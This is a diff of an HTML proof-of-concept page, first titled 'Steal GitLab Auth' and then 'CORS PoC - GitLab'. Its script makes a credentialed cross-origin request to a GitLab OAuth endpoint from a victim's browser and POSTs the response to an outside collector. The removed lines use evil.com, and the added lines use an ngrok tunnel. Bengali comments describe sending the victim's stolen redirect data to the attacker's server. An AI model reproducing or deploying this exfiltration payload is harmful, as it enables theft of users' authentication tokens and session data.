@@ -1,33 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Steal GitLab Auth</title>
+  <title>CORS PoC - GitLab</title>
 </head>
 <body>
-  <h1>Loading…</h1>
+  <h2>Loading... Please wait</h2>
+
   <script>
-    // অটোমেটেড GET রিকোয়েস্ট
-    fetch(
-      "https://projects.gitlab.io/auth?domain=https://docs.gitlab.com&state=iKOkN_x-pvhbvNdNe3Ra1g==",
-      {
-        method: "GET",
-        credentials: "include"  // কুকি/ক্রস-সাইট সেশন পাঠাবে
-      }
-    )
-    .then(res => res.text())
-    .then(text => {
-      // চুরির পর ফলাফল own সার্ভারে POST
-      return fetch("https://evil.com/collect", {
+    // ভিক্টিমের ব্রাউজার থেকে GitLab OAuth redirect রেসপন্স নিয়ে তোমার ngrok সার্ভারে পাঠানো হবে
+    fetch("https://projects.gitlab.io/auth?domain=https://docs.gitlab.com&state=iKOkN_x-pvhbvNdNe3Ra1g==", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+      // তোমার ngrok endpoint এ POST করে পাঠাবে
+      fetch("https://584b8b34f84d.ngrok-free.app", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ data: text })
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: data
       });
     })
-    .then(() => {
-      document.body.innerHTML = "<h1>Done!</h1>";
-    })
-    .catch(err => {
-      document.body.innerHTML = "<h1>Error:</h1><pre>" + err + "</pre>";
+    .catch(error => {
+      document.body.innerHTML += "<pre>Request failed: " + error + "</pre>";
     });
   </script>
 </body>
